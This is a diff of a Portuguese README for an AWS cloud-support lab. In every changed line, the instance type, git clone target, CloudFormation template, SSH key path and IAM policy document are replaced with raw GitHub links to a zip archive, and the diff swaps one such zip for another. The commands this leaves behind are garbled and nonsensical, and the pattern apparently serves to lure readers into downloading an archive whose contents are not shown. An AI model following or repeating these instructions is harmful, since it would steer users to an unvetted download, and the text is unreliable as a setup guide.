@@ -16,7 +16,7 @@ Este projeto simula um ambiente AWS real usado por uma pequena empresa. O objeti
 | Componente | Tipo | Descrição |
 |---|---|---|
 | **VPC** | Networking | 10.0.0.0/16, com subnets públicas e privadas |
-| **EC2** | Compute | 2 instâncias https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip (Web + DB) |
+| **EC2** | Compute | 2 instâncias https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/docs/aws_cloudsupport_lab_2.1.zip (Web + DB) |
 | **S3** | Storage | Bucket para backups e logs com versionamento |
 | **IAM** | Access | Roles/Policies com least privilege |
 | **Security Groups** | Firewall | SGs separados para web e database |
@@ -33,7 +33,7 @@ Este projeto simula um ambiente AWS real usado por uma pequena empresa. O objeti
 ### 1. Clonar o repositório
 
 ```bash
-git clone https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip
+git clone https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/docs/aws_cloudsupport_lab_2.1.zip
 cd aws-cloudsupport-lab
 ```
 
@@ -43,7 +43,7 @@ cd aws-cloudsupport-lab
 # Criar a stack
 aws cloudformation create-stack \
   --stack-name cloudsupport-lab \
-  --template-body https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip \
+  --template-body https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/docs/aws_cloudsupport_lab_2.1.zip \
   --parameters ParameterKey=KeyName,ParameterValue=YOUR_KEY_NAME \
   --capabilities CAPABILITY_NAMED_IAM
 
@@ -56,7 +56,7 @@ aws cloudformation wait stack-create-complete \
 
 ```bash
 # Via SSH (public instance)
-ssh -i https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip ec2-user@PUBLIC_IP
+ssh -i https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/docs/aws_cloudsupport_lab_2.1.zip ec2-user@PUBLIC_IP
 
 # Via Systems Manager (private instance)
 aws ssm start-session --target INSTANCE_ID
@@ -104,7 +104,7 @@ Adicionar permissão S3 à role:
 aws iam put-role-policy \
   --role-name EC2-S3-Role \
   --policy-name S3-Access \
-  --policy-document https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip
+  --policy-document https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/docs/aws_cloudsupport_lab_2.1.zip
 ```
 
 ### Incidente #3: Database Não Responde (Network Timeout)
